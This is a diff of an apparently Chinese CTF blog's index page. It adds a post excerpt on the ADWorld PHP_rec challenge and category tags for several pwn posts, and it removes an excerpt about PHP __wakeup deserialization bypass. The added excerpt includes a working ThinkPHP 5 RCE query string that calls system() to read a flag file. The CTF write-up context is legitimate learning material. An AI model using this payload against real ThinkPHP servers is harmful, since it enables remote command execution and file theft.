@@ -140,6 +140,45 @@
     
     
     <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BAPHP-rec/">
+        <p class="h4 index-header">攻防世界高手进阶区PHP_rec</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">php_rec进去以后F12看源码，什么都没发现。用御剑扫描一波没发现什么。就直接搜索thinkphp5 rce漏洞,改一改payload就出了。
+
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20../../../flag
+
+</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-19&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%8Cweb">攻防世界，web</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/WEB%EF%BC%8Cphp">WEB，php</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
       <a href="/2020/01/16/Linux%E4%B8%8B%E5%AE%89%E8%A3%85UPX/">
         <p class="h4 index-header">Linux下安装UPX</p>
         
@@ -257,6 +296,16 @@ int main(){
           <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-14&nbsp;&nbsp;
         
         
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/pwn">pwn</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/pwn">pwn</a>&nbsp;
+          
         
       </div>
     </div>
@@ -288,6 +337,16 @@ int main(){
           <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-13&nbsp;&nbsp;
         
         
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/pwn">pwn</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/pwn">pwn</a>&nbsp;
+          
         
       </div>
     </div>
@@ -342,6 +401,16 @@ level 6grep（global search regular expression(RE) and print out the line，全�
           <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-12&nbsp;&nbsp;
         
         
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/pwn">pwn</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/pwn">pwn</a>&nbsp;
+          
         
       </div>
     </div>
@@ -527,65 +596,6 @@ strstr() 函数搜索字符串在另一字符串中的第一次出现。注释�
           <i class="iconfont icon-tag"></i>
           
             <a href="/tags/WEB%EF%BC%8Cupload">WEB，upload</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/12/25/wakeup%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87/">
-        <p class="h4 index-header">__wakeup漏洞绕过</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">__wakeup()函数用法wakeup()是用在反序列化操作中。unserialize()会检查存在一个wakeup()方法。如果存在，则先会调用__wakeup()方法。
-&lt;?php
-class A{
-function __wakeup(){
-echo &#39;Hello&#39;;
-}
-}
-$c = new A();
-$d=unserialize(&#39;O:1:&quot;A&quot;:0:{}&#39;);
-?&gt;最后页面输出了Hello。在反序列化的时候存在__wakeup()函数，所以最后就会输出Hello__wakeup()函数漏洞说明
-&lt;?php
-class Student{
-public $full_name = &#39;zhangsan&#39;;
-public $score = 150;
-public $grades = array();
-
-function __wakeup() {
-echo &quot;__wakeup is invoked&quot;;
-}
-}
-
-$s = new Student();
-var_dump(serial</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-25&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/WEB">WEB</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/WEB">WEB</a>&nbsp;
-          
-            <a href="/tags/PHP">PHP</a>&nbsp;
           
         
       </div>
